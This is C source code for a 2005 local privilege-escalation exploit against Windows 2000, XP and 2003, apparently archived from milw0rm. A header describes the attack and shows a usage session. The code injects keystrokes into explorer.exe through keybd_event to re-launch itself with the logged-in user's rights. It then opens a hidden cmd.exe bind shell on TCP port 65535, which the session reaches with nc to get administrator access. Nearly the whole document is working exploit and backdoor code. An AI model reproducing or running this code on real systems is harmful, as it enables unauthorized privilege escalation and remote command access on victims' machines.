/*
 * Microsoft Windows keybd_event validation vulnerability.
 *          Local privilege elevation
 *
 * Credits:    Andres Tarasco ( aT4r _@_ haxorcitos.com )
 *             Iñaki Lopez    ( ilo _@_ reversing.org )
 *
 * Platforms afected/tested:
 *
 *     - Windows 2000
 *     - Windows XP
 *     - Windows 2003
 *
 *
 * Original Advisory: http://www.haxorcitos.com
 *                    http://www.reversing.org  
 *
 * Exploit Date: 08 / 06 / 2005
 *
 * Orignal Advisory:
 * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
 * AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
 * WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
 *
 * Attack Scenario:
 *
 * a) An attacker who gains access to an unprivileged shell/application executed
 * with the application runas.
 * b) An attacker who gains access to a service with flags INTERACT_WITH_DESKTOP
 *
 * Impact:
 *
 * Due to an invalid keyboard input validation, its possible to send keys to any
 * application of the Desktop.
 * By sending some short-cut keys its possible to execute code and elevate privileges
 * getting loggued user privileges and bypass runas/service security restriction.
 *
 * Exploit usage:
 *
 * C:\>whoami
 * AQUARIUS\Administrador
 *
 * C:\>runas /user:restricted cmd.exe
 * Escribir contraseña para restricted:
 * Intentando iniciar "cmd.exe" como usuario "AQUARIUS\restricted"...
 *
 *
 * Microsoft Windows 2000 [Versión 5.00.2195]
 * (C) Copyright 1985-2000 Microsoft Corp.
 *
 * C:\WINNT\system32>cd \
 *
 * C:\>whoami
 * AQUARIUS\restricted
 *
 * C:\>tlist.exe |find "explorer.exe"
 * 1140 explorer.exe      Program Manager
 *
 * C:\>c:\keybd.exe 1140
 * HANDLE Found. Attacking =)
 *
 * C:\>nc localhost 65535
 * Microsoft Windows 2000 [Versión 5.00.2195]
 * (C) Copyright 1985-2000 Microsoft Corp.
 *
 * C:\>whoami
 * whoami
 * AQUARIUS\Administrador
 *
 *
 * DONE =)
 *
 */

#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#define HAXORCITOS 65535
unsigned int pid = 0;
char buf[256]="";

/**************************************************************/
void ExplorerExecution (HWND hwnd, LPARAM lParam){
	DWORD hwndid;
    int i;


	GetWindowThreadProcessId(hwnd,&hwndid);

	if (hwndid == pid){
    /*
      Replace keybd_event with SendMessage() and PostMessage() calls 
    */
        printf("HANDLE Found. Attacking =)\n");
        SetForegroundWindow(hwnd);
        keybd_event(VK_LWIN,1,0,0);
        keybd_event(VkKeyScan('r'),1,0,0);
        keybd_event(VK_LWIN,1,KEYEVENTF_KEYUP,0);
        keybd_event(VkKeyScan('r'),1,KEYEVENTF_KEYUP,0);
        for(i=0;i<strlen(buf);i++) {
            if (buf[i]==':') {
                keybd_event(VK_SHIFT,1,0,0);
                keybd_event(VkKeyScan(buf[i]),1,0,0);
                keybd_event(VK_SHIFT,1,KEYEVENTF_KEYUP,0);
                keybd_event(VkKeyScan(buf[i]),1,KEYEVENTF_KEYUP,0);
            } else {
                if (buf[i]=='\\') {
                    keybd_event(VK_LMENU,1,0,0);
                    keybd_event(VK_CONTROL,1,0,0);
                    keybd_event(VkKeyScan('º'),1,0,0);
                    keybd_event(VK_LMENU,1,KEYEVENTF_KEYUP,0);
                    keybd_event(VK_CONTROL,1,KEYEVENTF_KEYUP,0);
                    keybd_event(VkKeyScan('º'),1,KEYEVENTF_KEYUP,0);
                } else {
                    keybd_event(VkKeyScan(buf[i]),1,0,0);
                    keybd_event(VkKeyScan(buf[i]),1,KEYEVENTF_KEYUP,0);
                }
            }
        }
        keybd_event(VK_RETURN,1,0,0);
        keybd_event(VK_RETURN,1,KEYEVENTF_KEYUP,0);
        exit(1);
    }
}
/**************************************************************/

int BindShell(void) { //Bind Shell. POrt 65535

	SOCKET				s,s2;
	STARTUPINFO			si;
    PROCESS_INFORMATION pi;
	WSADATA				HWSAdata;
	struct				sockaddr_in sa;
	int					len;

	if (WSAStartup(MAKEWORD(2,2), &HWSAdata) != 0) { exit(1); }
	if ((s=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0))==INVALID_SOCKET){ exit(1); }

    sa.sin_family		= AF_INET;
    sa.sin_port			= (USHORT)htons(HAXORCITOS);
    sa.sin_addr.s_addr	= htonl(INADDR_ANY);
    len=sizeof(sa);
    if ( bind(s, (struct sockaddr *) &sa, sizeof(sa)) == SOCKET_ERROR ) { return(-1); }
    if ( listen(s, 1) == SOCKET_ERROR ) { return(-1); }
    s2 = accept(s,(struct sockaddr *)&sa,&len);
    closesocket(s);

	ZeroMemory( &si, sizeof(si) );  ZeroMemory( &pi, sizeof(pi) );
	si.cb			= sizeof(si);
	si.wShowWindow  = SW_HIDE;
    si.dwFlags		=STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.hStdInput	= (void *) s2; // SOCKET
    si.hStdOutput	= (void *) s2;
    si.hStdError	= (void *) s2;
    if (!CreateProcess( NULL ,"cmd.exe",NULL, NULL,TRUE, 0,NULL,NULL,&si,&pi)) {
        doFormatMessage(GetLastError());
        return(-1);
    }

    WaitForSingleObject( pi.hProcess, INFINITE );
	closesocket(s);
	closesocket(s2);
    printf("SALIMOS...\n");
    Sleep(5000);
    return(1);


}
/**************************************************************/
void main(int argc, char* argv[])
{
    HWND console_wnd = NULL;
    
	if (argc >= 2) {
        pid = atoi (argv[1]);
        strncpy(buf,argv[0],sizeof(buf)-1);
	    EnumWindows((WNDENUMPROC)ExplorerExecution,(long)(&console_wnd));
    } else {
        BindShell();
    }
}
/**************************************************************/

// milw0rm.com [2005-09-06]